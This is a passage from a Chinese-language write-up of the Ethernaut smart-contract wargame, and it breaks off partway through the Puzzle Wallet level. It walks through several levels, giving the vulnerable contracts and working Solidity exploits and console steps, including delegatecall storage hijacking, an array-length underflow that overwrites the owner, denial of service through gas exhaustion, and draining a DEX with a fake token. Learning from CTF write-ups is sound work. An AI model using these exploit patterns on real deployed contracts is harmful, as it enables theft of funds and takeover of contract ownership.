SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract GatekeeperTwo {\n\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        uint x;\n        assembly { x := extcodesize(caller()) }\n        require(x == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n</code></pre> <p>\u548c\u4e0a\u4e00\u9898\u4e00\u6837\uff0c\u4e5f\u662f\u6709\u4e09\u4e2a\u8981\u6c42\uff1a</p> <ul> <li>msg.sender != tx.origin</li> <li>\u5f53\u524d caller \u7684 codesize \u4e3a 0</li> <li>gateKey \u5f02\u6216 sender \u7684 keccak256 \u7684\u524d 8 \u5b57\u8282\u4e3a 0-1=0xFFFFFFFFFFFFFFFF</li> </ul> <p>\u7b2c\u4e00\u4e2a\u540c\u6837\u901a\u8fc7\u5408\u7ea6\u89e3\u51b3</p> <p>\u7b2c\u4e8c\u4e2a\uff0c\u5f53\u5408\u7ea6\u8fd8\u6ca1\u521b\u5efa\u5b8c\u6210\u7684\u65f6\u5019 codesize \u4e3a 0\uff0c\u6240\u4ee5 exp \u8981\u5199\u5728 constructor \u91cc</p> <p>\u7b2c\u4e09\u4e2a\uff0c\u5f02\u6216\u8ba1\u7b97\u4e00\u4e0b\u5c31\u597d</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    GatekeeperTwo challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperTwo(addr);\n        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0xFFFFFFFFFFFFFFFF);\n        challenge.enter(bytes8(key));\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#naught-coin","title":"Naught Coin","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\ncontract NaughtCoin is ERC20 {\n\n    // string public constant name = 'NaughtCoin';\n    // string public constant symbol = '0x0';\n    // uint public constant decimals = 18;\n    uint public timeLock = now + 10 * 365 days;\n    uint256 public INITIAL_SUPPLY;\n    address public player;\n\n    constructor(address _player) \n    ERC20('NaughtCoin', '0x0')\n    public {\n        player = _player;\n        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n        // _totalSupply = INITIAL_SUPPLY;\n        // _balances[player] = INITIAL_SUPPLY;\n        _mint(player, INITIAL_SUPPLY);\n        emit Transfer(address(0), player, INITIAL_SUPPLY);\n    }\n\n    function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n        super.transfer(_to, _value);\n    }\n\n    // Prevent the initial owner from transferring tokens until the timelock has passed\n    modifier lockTokens() {\n        if (msg.sender == player) {\n            require(now &gt; timeLock);\n            _;\n        } else {\n            _;\n        }\n    } \n} \n</code></pre> <p>\u6839\u636e ERC-20 \u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff0c\u5408\u7ea6\u5728 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol</p> <p>\u9898\u76ee\u7ed9 transfer \u51fd\u6570\u52a0\u4e86 modifier\uff0c\u5224\u65ad\u65f6\u95f4\u5927\u4e8e\u5341\u5e74\u624d\u4f1a\u901a\u8fc7\uff0c\u53d1\u51fa transfer</p> <p>\u4f46\u662f\u6839\u636e ERC-20 \u7684\u5408\u7ea6\u6e90\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd8\u6709\u4e00\u4e2a transferFrom \u51fd\u6570\u53ef\u4ee5\u7528\u6765\u8f6c\u79fb\u4ee3\u5e01</p> <pre><code>function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n) public virtual override returns (bool) {\n    address spender = _msgSender();\n    _spendAllowance(from, spender, amount);\n    _transfer(from, to, amount);\n    return true;\n}\n</code></pre> <p>\u800c\u8fd9\u8981\u6d88\u8017 allowance\uff0c\u4f46\u662f approve \u51fd\u6570\u5e76\u6ca1\u6709\u65bd\u52a0\u9650\u5236\uff0c\u6240\u4ee5\u5148 approve \u4e00\u5b9a\u7684\u6570\u91cf\uff0c\u7136\u540e transferFrom \u5c31\u53ef\u4ee5\u8f6c\u79fb\u51fa player \u8eab\u4e0a\u7684\u5168\u90e8\u4ee3\u5e01\u4f59\u989d</p> <pre><code>&gt; (await contract.balanceOf(player)).toString()\n'1000000000000000000000000'\n&gt; contract.approve(player, \"1000000000000000000000000\")\n&gt; contract.transferFrom(player, instance, \"1000000000000000000000000\")\n&gt; (await contract.balanceOf(player)).toString()\n'0'\n</code></pre>"},{"location":"writeups/ethernaut/#preservation","title":"Preservation","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Preservation {\n\n    // public library contracts \n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner; \n    uint storedTime;\n    // Sets the function signature for delegatecall\n    bytes4 constant setTimeSignature = bytes4(keccak256(\"setTime(uint256)\"));\n\n    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {\n        timeZone1Library = _timeZone1LibraryAddress; \n        timeZone2Library = _timeZone2LibraryAddress; \n        owner = msg.sender;\n    }\n\n    // set the time for timezone 1\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n\n    // set the time for timezone 2\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));\n    }\n}\n\n// Simple library contract to set the time\ncontract LibraryContract {\n\n    // stores a timestamp \n    uint storedTime;  \n\n    function setTime(uint _time) public {\n        storedTime = _time;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\u3002\u4f46\u662f\u4ece\u9898\u76ee\u5408\u7ea6\u4e2d\u770b\u4e0d\u5230\u4efb\u4f55\u548c\u66f4\u6539 owner \u6709\u5173\u7684\u51fd\u6570</p> <p>\u6839\u636e\u63d0\u793a\uff0c\u8fd9\u4e2a\u5408\u7ea6\u7684\u6f0f\u6d1e\u5728\u4e8e\u901a\u8fc7 delegatecall \u4fee\u6539\u5b58\u50a8</p> <p>\u901a\u8fc7 delegatecall \u6765\u8c03\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684\u51fd\u6570\u5e76\u4e0d\u4f1a\u52a8\u7528\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 storage\uff0c\u800c\u662f\u4f7f\u7528\u672c\u5730 storage\u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u5728 setFirstTime \u51fd\u6570\u4e2d\u8c03\u7528 setTime \u51fd\u6570\u65f6\u66f4\u6539 storedTime \u5b9e\u9645\u4e0a\u4f1a\u66f4\u6539\u5904\u4e8e storage \u4e2d\u76f8\u540c\u4f4d\u7f6e\u7684 timeZone1Library\u3002\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21\u8c03\u7528 setFirstTime \u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2a\u5730\u5740\u5408\u7ea6\u7684 setTime \u51fd\u6570</p> <p>\u56e0\u6b64\u53ef\u4ee5\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5176\u4e2d\u5b9e\u73b0 setTime \u51fd\u6570\uff0c\u91cc\u9762\u5c06 owner \u6539\u4e3a\u8f93\u5165\uff08\u6ce8\u610f\u8981\u5c06\u653b\u51fb\u5408\u7ea6\u7684\u5185\u5b58\u5e03\u5c40\u641e\u7684\u548c Preservation \u5408\u7ea6\u76f8\u540c\uff09\uff0c\u8fd9\u6837\u7b2c\u4e00\u6b21 setFirstTime \u4f7f\u5c06 timeZone1Library \u6539\u4e3a\u653b\u51fb\u5408\u7ea6\u7684\u5730\u5740\uff0c\u7b2c\u4e8c\u6b21 setFirstTime \u5c31\u53ef\u4ee5\u8c03\u7528\u5230\u653b\u51fb\u5408\u7ea6\u7684 setTime \u51fd\u6570\uff0c\u66f4\u6539 owner\u3002\u653b\u51fb\u5408\u7ea6\uff1a</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;             // \u4fdd\u8bc1\u8fd9\u524d\u9762\u6709\u4e24\u4e2a address\n    function setTime(uint _time) public {\n        owner = address(_time);\n    }\n}\n</code></pre> <p>\u5b9e\u9645\u64cd\u4f5c\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;an address&gt;'\n&gt; contract.setFirstTime(\"0x&lt;Exploit contract address&gt;\")\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000000&lt;Exploit contract address&gt;'\n&gt; contract.setFirstTime(player)\n&gt; await web3.eth.getStorageAt(instance, 2) // owner\n'0x000000000000000000000000&lt;player address&gt;'\n&gt; await contract.owner()\n'0x&lt;player address&gt;'\n</code></pre></p>"},{"location":"writeups/ethernaut/#recovery","title":"Recovery","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Recovery {\n\n    //generate tokens\n    function generateToken(string memory _name, uint256 _initialSupply) public {\n        new SimpleToken(_name, msg.sender, _initialSupply);\n\n    }\n}\n\ncontract SimpleToken {\n\n    using SafeMath for uint256;\n    // public variables\n    string public name;\n    mapping (address =&gt; uint) public balances;\n\n    // constructor\n    constructor(string memory _name, address _creator, uint256 _initialSupply) public {\n        name = _name;\n        balances[_creator] = _initialSupply;\n    }\n\n    // collect ether in return for tokens\n    receive() external payable {\n        balances[msg.sender] = msg.value.mul(10);\n    }\n\n    // allow transfers of tokens\n    function transfer(address _to, uint _amount) public { \n        require(balances[msg.sender] &gt;= _amount);\n        balances[msg.sender] = balances[msg.sender].sub(_amount);\n        balances[_to] = _amount;\n    }\n\n    // clean up after ourselves\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n</code></pre> <p>\u9898\u610f\u662f instance \u8c03\u7528\u4e86 generateToken \u751f\u6210\u4e86\u4e00\u4e2a SimpleToken\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u751f\u6210\u7684\u5408\u7ea6\u5730\u5740\uff0c\u73b0\u5728\u8981\u8c03\u7528\u8fd9\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5176\u4e2d\u4f59\u989d\u8f6c\u5230 player \u8d26\u6237\u4e2d</p> <p>\u56e0\u4e3a\u533a\u5757\u94fe\u90fd\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u53bb Etherscan \u7684 Rinkeby \u7f51\u7edc\u4e2d\u67e5\u627e instance \u8fd9\u4e2a\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u53ca\u5176\u4e2d\u7684 internal txns\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a Contract Creation\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u662f\u751f\u6210\u7684 SimpleToken \u5730\u5740\uff0c\u6240\u4ee5\u5199\u4e00\u4e2a exp \u6765\u8c03\u7528\u90a3\u4e2a\u5730\u5740\u4e0a\u7684\u7684 destroy \u51fd\u6570\u5c31\u597d\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of SimpleToken */\n\ncontract Exploit {\n    SimpleToken token;\n    constructor(address payable challenge) public { // challenge \u662f\u627e\u5230\u7684 SimpleToken \u5730\u5740\n        token = SimpleToken(challenge);\n    }\n    function exp() public {\n        token.destroy(msg.sender);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#magicnumber","title":"MagicNumber","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract MagicNum {\n\n    address public solver;\n\n    constructor() public {}\n\n    function setSolver(address _solver) public {\n        solver = _solver;\n    }\n\n    /*\n        ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____        \n         __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___       \n          ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__      \n           ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___     \n            ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____    \n             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________   \n              _\\///////////\\\\\\//____/\\\\\\/___________  \n               ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_ \n                ___________\\///_____\\///////////////__\n    */\n}\n</code></pre> <p>\u9898\u76ee\u8981\u6c42\u5373\u5199\u4e00\u4e2a\u5408\u7ea6\uff0c\u5b57\u8282\u7801\u4e0d\u8d85\u8fc7 10 \u4e2a\u5b57\u8282\uff0c\u5728\u8c03\u7528 whatIsTheMeaningOfLife() \u65f6\u8fd4\u56de 42</p> <p>\u6240\u4ee5\u53ef\u4ee5\u624b\u5199\u6c47\u7f16\uff0c\u6765\u5bf9\u4e8e\u6240\u6709\u8c03\u7528\u90fd\u76f4\u63a5\u8fd4\u56de 42\uff0c\u8981\u7528\u5230\u51e0\u4e2a\u6307\u4ee4\uff08\u53ef\u4ee5\u5728 https://ethervm.io/ \u770b\u5230\u8be6\u7ec6\u7684\u6307\u4ee4\u4e0e\u5b57\u8282\u7801\u7684\u5bf9\u5e94\u4ee5\u53ca\u4f5c\u7528\uff09</p> <ul> <li>PUSH1\uff0860\uff09\uff1a\u5c06\u4e00\u4e2a uint8 \u538b\u5165\u6808\u4e2d</li> <li>MSTORE\uff0852\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa value\uff0c\u5c06 memory[offset:offset+32] \u8bbe\u7f6e\u4e3a value</li> <li>RETURN\uff08F3\uff09\uff1a\u6808\u9876\u53d6\u51fa offset\uff0c\u518d\u53d6\u51fa length\uff0creturn memory[offset:offset+length]</li> <li>CODECOPY\uff0839\uff09\uff1a\u4ece\u6808\u4e0a\u4f9d\u6b21\u53d6\u51fa destOffset\u3001offset\u3001length\uff0c\u8bbe\u7f6e memory[destOffset:destOffset+length] = code[offset:offset+length]</li> </ul> <p>\u5728\u90e8\u7f72\u5408\u7ea6\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u6709\u4e00\u6bb5 deploy code\uff0c\u7528\u6765\u628a runtime code \u590d\u5236\u5230\u6307\u5b9a\u4f4d\u7f6e\uff0c\u6240\u4ee5\u8981\u7f16\u5199\u4e24\u90e8\u5206\u5b57\u8282\u7801</p> <p>runtime code: <pre><code>PUSH1 0x2a  ; \u5c06 42 \u538b\u5165\u6808\u4e2d\nPUSH1 0x80  ; \u8981\u5b58\u50a8\u7684\u4f4d\u7f6e\uff0c\u4e00\u822c\u4e3a 0x80\nMSTORE      ; \u8bbe\u7f6e memory[0x80:0x80+0x20] = 0x2a\nPUSH1 0x20  ; length \nPUSH1 0x80  ; offset\nRETURN      ; return memory[0x80:0x80+0x20]\n</code></pre> \u8f6c\u6362\u6210\u5b57\u8282\u7801\u5c31\u662f\uff1a602a 6080 52 6020 6080 f3</p> <p>\u63a5\u4e0b\u6765\u8981\u5199 deploy code\uff0c\u5176\u4e2d\u8981\u5b8c\u6210\u4e24\u4e2a\u76ee\u6807\uff1a</p> <ol> <li>\u5c06 runtime code \u5b57\u8282\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d</li> <li>\u5c06 runtime code \u8fd4\u56de</li> </ol> <p>EVM \u6c47\u7f16\uff1a <pre><code>PUSH1 0x0a  ; length, runtime code \u957f\u5ea6\u4e3a 10 (0x0a)\nPUSH1 0x0c  ; offset, \u5373 deploy code \u7684\u957f\u5ea6\uff0c\u6574\u4f53\u7b97\u4e0b\u6765\u4e3a 0x0C\nPUSH1 0x00  ; destOffset, \u5b58\u5165\u5185\u5b58\u4e2d\u8d77\u59cb\u4f4d\u7f6e\nCODECOPY    ; \u5c06 runtime code \u62f7\u8d1d\u5230\u5185\u5b58\u5f00\u5934\nPUSH1 0x0a  ; length\nPUSH1 0x00  ; offset\nRETURN      ; \u8fd4\u56de runtime code\n</code></pre> \u8f6c\u6362\u6210\u5b57\u8282\u7801\uff1a600a 600c 6000 39 600a 6000 f3\uff08\u957f\u5ea6\u6b63\u597d\u5bf9\u5e94 0x0c\uff09</p> <p>\u8fde\u8d77\u6765\u5c31\u662f\u6700\u7ec8\u7684\u5b57\u8282\u7801\uff1a600a600c600039600a6000f3602a60805260206080f3</p> <p>\u7136\u540e\u901a\u8fc7\u5411\u7a7a\u5730\u5740\u53d1\u9001\u4ea4\u6613\u7684\u5f62\u5f0f\u521b\u5efa\u5408\u7ea6\uff0c\u5e76\u627e\u5230\u5408\u7ea6\u5730\u5740\u518d setSolver \u5373\u53ef <pre><code>&gt; web3.eth.sendTransaction({from: player, data: \"0x600a600c600039600a6000f3602a60805260206080f3\"})\n\u26cf\ufe0f Sent transaction \u26cf https://rinkeby.etherscan.io/tx/&lt;transaction hash&gt;\n\u26cf\ufe0f Mined transaction \u26cf https://rinkeby.etherscan.io/tx/&lt;transaction hash&gt;\n&gt; contract.setSolver(\"&lt;contract address&gt;\")\n</code></pre> \u5176\u4e2d contract address \u901a\u8fc7\u8bbf\u95ee\u7ed9\u51fa\u7684 etherscan \u7684\u7f51\u5740\u5c31\u53ef\u4ee5\u67e5\u5230\u521b\u5efa\u7684\u5408\u7ea6\u5730\u5740</p>"},{"location":"writeups/ethernaut/#alien-codex","title":"Alien Codex","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable {\n\n    bool public contact;\n    bytes32[] public codex;\n\n    modifier contacted() {\n        assert(contact);\n        _;\n    }\n\n    function make_contact() public {\n        contact = true;\n    }\n\n    function record(bytes32 _content) contacted public {\n        codex.push(_content);\n    }\n\n    function retract() contacted public {\n        codex.length--;\n    }\n\n    function revise(uint i, bytes32 _content) contacted public {\n        codex[i] = _content;\n    }\n}\n</code></pre> <p>\u8981\u6c42\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u8fd9\u4e2a owner \u7684\u5b58\u50a8\u662f\u5728 Ownable \u4e2d\u5b9a\u4e49\u7684\uff0c\u5b83\u4f1a\u548c contact \u4e00\u8d77\u653e\u5728 storage \u7684 slot 0 \u5904\uff0c\u76ee\u7684\u5c31\u662f\u6539\u53d8\u8fd9\u4e2a\u4f4d\u7f6e\u7684\u503c</p> <p>\u800c slot 1 \u7684\u4f4d\u7f6e\u5f00\u59cb\u5c31\u662f codex \u7684\u5b58\u50a8\uff0c\u5148\u662f\u957f\u5ea6\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528 retract() \u51fd\u6570\u6765\u4f7f length \u5411\u4e0b\u6ea2\u51fa\u53d8\u6210 2**256-1\uff0c\u4e5f\u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5168\u90e8\u7684 storage \u533a\u57df\uff0c\u6240\u4ee5\u5c31\u53ea\u9700\u8981\u627e\u5230 slot 0 \u5bf9\u5e94\u7684 codex[i] \u7684 i</p> <p>\u56e0\u4e3a codex[i] \u5b9e\u9645\u4e0a\u662f\u8868\u793a keccak256(slot of codex) + i \u5904\uff0c\u6240\u4ee5\u53ea\u8981\u4ee4 i = 2**256 - keccak256(slot of codex) \u5c31\u53ef\u4ee5\u4f7f\u5176\u53d8\u4e3a 2**256\uff0c\u5373\u6ea2\u51fa\u5230 0 \u7684\u4f4d\u7f6e</p> <p>\u800c codex \u7684 slot \u5c31\u662f 1\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8ba1\u7b97 2**256 - keccak256(1): <pre><code>contract Exploit {\n    function calc() public view returns (bytes32) {\n        return keccak256(abi.encode(bytes32(uint(1))));\n    }\n}\n</code></pre> \u5f97\u5230 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6\uff0c\u7528 2**256 \u51cf\u53bb\u5b83\u5f97\u5230 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</p> <p>\u7136\u540e\u66f4\u6539\u8fd9\u4e2a\u4f4d\u7f6e\u5230 player \u5730\u5740\u5c31\u597d\u4e86\uff08\u8981\u5728\u5730\u5740\u524d\u9762\u8865\u4e0a\u4e00\u5806 0 \u548c contact\uff09 <pre><code>&gt; contract.retract()\n&gt; await web3.eth.getStorageAt(instance, 0)\n'0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'\n&gt; contract.revise(\"0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a\", \"0x000000000000000000000001&lt;player address&gt;\")\n</code></pre></p>"},{"location":"writeups/ethernaut/#denial","title":"Denial","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Denial {\n\n    using SafeMath for uint256;\n    address public partner; // withdrawal partner - pay the gas, split the withdraw\n    address payable public constant owner = address(0xA9E);\n    uint timeLastWithdrawn;\n    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances\n\n    function setWithdrawPartner(address _partner) public {\n        partner = _partner;\n    }\n\n    // withdraw 1% to recipient and 1% to owner\n    function withdraw() public {\n        uint amountToSend = address(this).balance.div(100);\n        // perform a call without checking return\n        // The recipient can revert, the owner will still get their share\n        partner.call{value:amountToSend}(\"\");\n        owner.transfer(amountToSend);\n        // keep track of last withdrawal time\n        timeLastWithdrawn = now;\n        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);\n    }\n\n    // allow deposit of funds\n    receive() external payable {}\n\n    // convenience function\n    function contractBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u8981\u963b\u6b62 owner \u5728 withdraw \u7684\u65f6\u5019\u63d0\u53d6\u5230\u8d44\u4ea7</p> <p>\u91cd\u5165\u653b\u51fb\u6ca1\u6709\u6253\u51fa\u6765\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8ba9\u653b\u51fb\u5408\u7ea6\u7684 fallback \u89e6\u53d1 assert \u5f02\u5e38\uff0c\u8fd9\u6837\u6d88\u8017\u6389\u6240\u6709\u7684 gas \u540e\u5c31\u518d\u6ca1\u6cd5\u6b63\u5e38\u5411 owner \u8f6c\u8d26\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Denial */\n\ncontract Exploit {\n    Denial challenge;\n    constructor(address payable addr) public {\n        challenge = Denial(addr);\n    }\n    function exp() public {\n        challenge.setWithdrawPartner(address(this));\n        challenge.withdraw();\n    }\n    receive() external payable {\n        assert(false);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#shop","title":"Shop","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface Buyer {\n    function price() external view returns (uint);\n}\n\ncontract Shop {\n    uint public price = 100;\n    bool public isSold;\n\n    function buy() public {\n        Buyer _buyer = Buyer(msg.sender);\n\n        if (_buyer.price() &gt;= price &amp;&amp; !isSold) {\n            isSold = true;\n            price = _buyer.price();\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u4f7f price \u5c0f\u4e8e 100\u3002\u548c Elevator \u7c7b\u4f3c\uff0c\u53ea\u8981\u4f7f\u4e24\u6b21\u8c03\u7528 price \u5f97\u5230\u7684\u503c\u4e0d\u4e00\u6837\u5c31\u53ef\u4ee5\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Shop */\n\ncontract Exploit {\n    Shop challenge;\n    constructor(address addr) public {\n        challenge = Shop(addr);\n    }\n    function price() external view returns (uint) {\n        if (challenge.isSold()) {\n            return 90;\n        }\n        return 100;\n    }\n    function exp() public {\n        challenge.buy();\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#dex-dex-two","title":"Dex &amp; Dex Two","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Dex {\n    using SafeMath for uint;\n    address public token1;\n    address public token2;\n    constructor(address _token1, address _token2) public {\n        token1 = _token1;\n        token2 = _token2;\n    }\n\n    function swap(address from, address to, uint amount) public {\n        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, \"Not enough to swap\");\n        uint swap_amount = get_swap_price(from, to, amount);\n        IERC20(from).transferFrom(msg.sender, address(this), amount);\n        IERC20(to).approve(address(this), swap_amount);\n        IERC20(to).transferFrom(address(this), msg.sender, swap_amount);\n    }\n\n    function add_liquidity(address token_address, uint amount) public{\n        IERC20(token_address).transferFrom(msg.sender, address(this), amount);\n    }\n\n    function get_swap_price(address from, address to, uint amount) public view returns(uint){\n        return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));\n    }\n\n    function approve(address spender, uint amount) public {\n        SwappableToken(token1).approve(spender, amount);\n        SwappableToken(token2).approve(spender, amount);\n    }\n\n    function balanceOf(address token, address account) public view returns (uint){\n        return IERC20(token).balanceOf(account);\n    }\n}\n\ncontract SwappableToken is ERC20 {\n    constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {\n        _mint(msg.sender, initialSupply);\n    }\n}\n</code></pre> <p>\u9898\u610f\u5c31\u662f\u73a9\u5bb6\u8d26\u6237\u4e0a\u7684 token1 \u548c token2 \u90fd\u5404\u6709 10 \u4e2a token\uff0c\u800c\u9898\u76ee\u8d26\u6237\u4e0a\u6709 100 \u4e2a\uff0c\u76ee\u7684\u662f\u628a\u9898\u76ee\u8d26\u6237\u4e0a\u7684\u67d0\u4e2a token \u6e05\u96f6</p> <p>\u9898\u76ee\u7684 Dex \u5408\u7ea6\u4e3b\u8981\u63d0\u4f9b\u4e86 swap \u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5728\u4e24\u4e2a token \u95f4\u4ea4\u6362\u91d1\u989d\u3002\u4f46\u662f\u8f6c\u51fa\u7684\u65f6\u5019\u5148\u8c03\u7528\u4e86 get_swap_price \u6765\u8ba1\u7b97\u91d1\u989d\uff0c\u800c\u4e14\u5728\u5176\u4e2d\u8c03\u7528\u7684\u662f\u4e24\u65b9\u683c\u5b50\u7684 balanceOf \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u65b0\u7684 IERC20 \u7684 token\uff0c\u8ba9\u5b83\u7684 balanceOf \u59cb\u7ec8\u8fd4\u56de 1\uff0c\u4f5c\u4e3a\u5206\u6bcd\uff0c\u8fd9\u6837\u8f6c\u51fa\u7684\u65f6\u5019\u5c31\u4f1a\u8f6c\u51fa\u9898\u76ee token \u4e2d\u7684\u6240\u6709\u4f59\u989d\u4e86</p> <p>Dex Two \u548c Dex \u5dee\u522b\u5c31\u5728\u4e8e DexTwo \u9700\u8981\u5c06\u4e24\u4e2a token \u90fd\u7f6e\u4e3a 0\uff0c\u7528 exp \u51fd\u6570\u5206\u522b\u6253\u4e0b token1 \u548c token2 \u5c31\u884c</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Dex */\n\ncontract ExploitToken {\n    function balanceOf(address account) public view returns (uint256) {\n        return 1;\n    }\n    function transferFrom(address, address, uint256) public returns (bool) {\n        return true;\n    }\n}\n\ncontract Exploit {\n    address token = address(new ExploitToken());\n    Dex challenge;\n    constructor(address addr) public {\n        challenge = Dex(addr);\n    }\n    function exp(address token1) public {\n        challenge.swap(token, token1, 1);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#puzzle-wallet","title":"Puzzle Wallet","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\npragma experimental ABIEncoderV2;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\";\n\ncontract PuzzleProxy is UpgradeableProxy {\n    address public pendingAdmin;\n    address public admin;\n\n    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {\n        admin = _admin;\n    }\n\n    modifier onlyAdmin {\n        require(msg.sender == admin, \"Caller is not the admin\");\n        _;\n    }\n\n    function proposeNewAdmin(address _newAdmin) external {\n        pendingAdmin = _newAdmin;\n    }\n\n    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {\n        